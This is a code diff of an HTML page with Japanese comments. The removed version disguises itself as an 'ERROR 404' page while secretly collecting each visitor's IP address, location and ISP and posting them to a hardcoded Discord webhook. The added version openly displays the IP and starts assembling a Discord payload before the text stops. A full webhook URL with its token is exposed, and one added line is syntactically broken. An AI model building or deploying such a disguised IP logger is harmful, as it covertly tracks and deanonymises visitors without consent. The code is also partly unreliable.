@@ -1,38 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>ERROR 404</title>
+  <title>IP取得＆Discord送信</title>
 </head>
 <body>
-  <h1>ERROR 404</h1>
-  <p id="status">NOT FOUND</p>
+  <h1>IP取得テスト</h1>
+  <p id="status">IP取得中...</p>
 
   <script>
     // DiscordのWebhook URL（あなたのWebhookに置き換えてください）
     const webhookUrl = "https://discord.com/api/webhooks/1380138909631123547/nvpr4yz48EStbdjzFx6AL-92aoxXYFZay_fSmLLpZ-uGJePGx8N4aFfwF3bkkKtFqUZm";
 
     // IP取得
-    fetch('https://ipinfo.io/json')
-  .then(response => response.json())
-  .then(data => {
-    const ip = data.ip;
-    const city = data.city;
-    const region = data.region;
-    const country = data.country;
-    const isp = data.org; // ISP情報（組織名）
-
-    const webhookURL = "https://discord.com/api/webhooks/1380138909631123547/nvpr4yz48EStbdjzFx6AL-92aoxXYFZay_fSmLLpZ-uGJePGx8N4aFfwF3bkkKtFqUZm";
-    
-    fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ 
-        content: `IP: ${ip}\nLocation: ${city}, ${region}, ${country}\nISP: ${isp}`
-      })
-    });
-  })
-  .catch(error => console.error('Error:', error));
-        
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        document.getElementById("status").textContent = あなたのIPは ${ip} です;
 
         // Discordに送信する内容
         const payload = {
